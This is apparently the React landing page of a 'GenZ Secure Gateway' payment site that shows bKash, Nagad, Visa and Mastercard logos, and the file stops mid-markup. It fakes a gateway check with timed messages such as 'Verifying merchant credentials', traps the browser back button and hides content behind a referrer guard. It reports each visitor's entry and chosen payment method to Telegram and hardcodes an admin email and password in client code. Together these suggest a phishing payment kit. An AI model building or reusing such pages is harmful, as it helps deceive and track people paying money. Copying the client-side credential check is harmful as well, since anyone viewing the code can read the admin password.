import { useState, useEffect } from "react";
import { Home, Upload, X, Headphones, HelpCircle, Gift, LogIn, LogOut, Lock } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import DualCircleLoader from "@/components/DualCircleLoader";
import { sendTelegramNotification } from "@/lib/telegram";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import AllowedWebsitesAdmin from "@/components/AllowedWebsitesAdmin";
import CancelPaymentDialog from "@/components/CancelPaymentDialog";
import genzLogo from "@/assets/genz-logo.png";
import bkashLogo from "@/assets/bkash-logo.png";
import nagadLogo from "@/assets/nagad-logo.png";
import rocketLogo from "@/assets/rocket-logo.png";
import upayLogo from "@/assets/upay-logo.png";
import visaLogo from "@/assets/visa-logo.png";
import mastercardLogo from "@/assets/mastercard-logo-color.png";


const ADMIN_EMAIL = "abir789@gmail.com";
const ADMIN_PASSWORD = "778899";

const gatewayMessages = [
  "Connecting to GenZ Secure Gateway...",
  "Verifying merchant credentials...",
  "Authorizing transaction...",
  "Communicating with bank server...",
  "Finalizing secure gateway...",
];

const defaultEnabledMethods = {
  bkash: true,
  nagad: true,
  rocket: false,
  upay: false,
  visa: true,
  mastercard: true,
};

const paymentMethods = [
  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-16 md:h-20' },
  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
] as const;

const Index = () => {
  const { checking: referrerChecking } = useReferrerGuard();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [showGateway, setShowGateway] = useState(true);
  const [messageIndex, setMessageIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showLoader, setShowLoader] = useState(false);
  const [clickedCard, setClickedCard] = useState<string | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [showSupportModal, setShowSupportModal] = useState(false);
  const [showCancelDialog, setShowCancelDialog] = useState(false);
  const [supportNumber, setSupportNumber] = useState("");
  
  const [loginUnlocked, setLoginUnlocked] = useState(false);
  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>(defaultEnabledMethods);

  const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;

  // Back button interception
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      setShowCancelDialog(true);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, []);

  const handleConfirmCancel = () => {
    navigate(`/payment-cancelled?channel=GenZ&reason=Payment isn't completed&amount=${amount}`);
  };

  // Check admin session on mount
  useEffect(() => {
    if (sessionStorage.getItem("admin_logged_in") === "true") {
      setIsAdmin(true);
    }
  }, []);

  const handleAdminLogin = () => {
    if (loginEmail === ADMIN_EMAIL && loginPassword === ADMIN_PASSWORD) {
      setIsAdmin(true);
      setShowLoginModal(false);
      setLoginError("");
      sessionStorage.setItem("admin_logged_in", "true");
    } else {
      setLoginError("Invalid email or password");
    }
  };

  const handleAdminLogout = () => {
    sessionStorage.removeItem("admin_logged_in");
    setIsAdmin(false);
    setLoginUnlocked(false);
  };

  const toggleMethod = async (id: string, enabled: boolean) => {
    setEnabledMethods((prev) => ({ ...prev, [id]: enabled }));
    await supabase
      .from("payment_methods")
      .update({ enabled, updated_at: new Date().toISOString() })
      .eq("id", id);
  };

  // Fetch payment methods from DB and subscribe to realtime
  useEffect(() => {
    const fetchMethods = async () => {
      const { data } = await supabase.from("payment_methods").select("*");
      if (data) {
        const map: Record<string, boolean> = { ...defaultEnabledMethods };
        data.forEach((m) => {
          if (m.id in defaultEnabledMethods) {
            map[m.id] = m.enabled;
          }
        });
        setEnabledMethods(map);
      }
    };
    fetchMethods();

    // Send page entry notification with device, IP, and referrer
    sendTelegramNotification({
      type: 'page_entry',
      amount,
      referrer: document.referrer || 'Direct',
    });

    const channel = supabase
      .channel("payment_methods_realtime")
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "payment_methods" },
        (payload) => {
          setEnabledMethods((prev) => {
            if (!(payload.new.id in defaultEnabledMethods)) return prev;
            return {
              ...prev,
              [payload.new.id as string]: payload.new.enabled as boolean,
            };
          });
        }
      )
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const cardTypes = ['visa', 'mastercard'];
  const allVisibleMethodsDisabled = paymentMethods.every((method) => !(enabledMethods[method.id] ?? false));
  
  const handlePaymentSelect = (route: string) => {
    const methodName = route.replace('/', '');
    const isCard = cardTypes.includes(methodName);
    sendTelegramNotification({
      type: 'payment_activity',
      method: isCard ? methodName.charAt(0).toUpperCase() + methodName.slice(1) : methodName,
      paymentType: isCard ? 'card' : 'mfs',
      referrer: document.referrer || 'Direct',
    });
    
    if (isMobileOrTablet) {
      setClickedCard(route);
      setTimeout(() => {
        setShowLoader(true);
        setTimeout(() => navigate(`${route}?amount=${amount}`), 1500);
      }, 300);
    } else {
      setShowLoader(true);
      setTimeout(() => navigate(`${route}?amount=${amount}`), 1500);
    }
  };

  useEffect(() => {
    if (!showGateway) return;

    const totalDuration = 2000; // 2 seconds total
    const messageInterval = totalDuration / gatewayMessages.length;

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
      if (prev >= 100) return 100;
        return prev + 1;
      });
    }, 20);

    // Cycle through messages
    const msgTimer = setInterval(() => {
      setMessageIndex((prev) => {
        if (prev >= gatewayMessages.length - 1) return prev;
        return prev + 1;
      });
    }, messageInterval);

    // Hide gateway after all messages
    const hideTimer = setTimeout(() => {
      setShowGateway(false);
    }, totalDuration);

    return () => {
      clearInterval(progressInterval);
      clearInterval(msgTimer);
      clearTimeout(hideTimer);
    };
  }, [showGateway]);

  if (referrerChecking) {
    return null; // No content while checking referrer
  }

  if (showGateway) {
    return (
      <div className="min-h-[100dvh] w-screen bg-[#e8edf2] flex items-center justify-center p-4 overflow-hidden fixed inset-0 z-50">
        <div className="w-full max-w-md mx-auto">
          <div className="bg-gradient-to-br from-[#2d7dd2] via-[#2570c4] to-[#1a5fb4] rounded-2xl shadow-[0_20px_60px_rgba(26,95,180,0.4)] p-8 flex flex-col items-center relative overflow-hidden">
            {/* Subtle shimmer overlay */}
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent pointer-events-none" style={{ animation: 'shimmer 3s ease-in-out infinite' }} />
            
            {/* Animated Dots */}
            <div className="flex gap-3 mb-7 relative z-10">
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  className="w-2 h-2 rounded-full bg-white"
                  style={{
                    animation: `dotBounce 1.4s ease-in-out ${i * 0.16}s infinite`,
                  }}
                />
              ))}
            </div>

            {/* Logo */}
            <div className="w-20 h-20 rounded-full bg-[#1a2332] flex items-center justify-center mb-5 relative z-10 shadow-lg ring-2 ring-white/10">
              <img src={genzLogo} alt="GenZ" className="w-[72px] h-[72px] rounded-full object-cover" />
            </div>

            {/* Title */}
            <h2 className="text-white text-xl font-bold mb-2 relative z-10 tracking-wide">Processing Your Payment...</h2>
            <p className="text-white/75 text-sm mb-6 transition-all duration-500 min-h-[20px] relative z-10">
              {gatewayMessages[messageIndex]}
            </p>

            {/* Progress Bar */}
            <div className="w-full bg-white/20 rounded-full h-2.5 mb-6 overflow-hidden relative z-10 backdrop-blur-sm">
              <div
                className="h-full rounded-full transition-all duration-100 ease-linear"
                style={{
                  width: `${progress}%`,
                  background: 'linear-gradient(90deg, #ffffff 0%, #e0ecff 50%, #ffffff 100%)',
                  boxShadow: '0 0 10px rgba(255,255,255,0.5)',
                }}
              />
            </div>

            {/* Secure badge */}
            <div className="flex items-center gap-2 text-white/90 mb-2 relative z-10">
              <Lock className="w-4 h-4" />
              <span className="text-sm font-semibold tracking-wide">GenZ Secure Gateway</span>
            </div>
            <p className="text-white/40 text-xs relative z-10">Please do not close or refresh this page</p>
          </div>
        </div>

        <style>{`
          @keyframes dotBounce {
            0%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-8px); }
          }
          @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <>
      <div className="h-screen bg-background flex items-start md:items-center justify-center p-2 md:p-4 overflow-hidden">
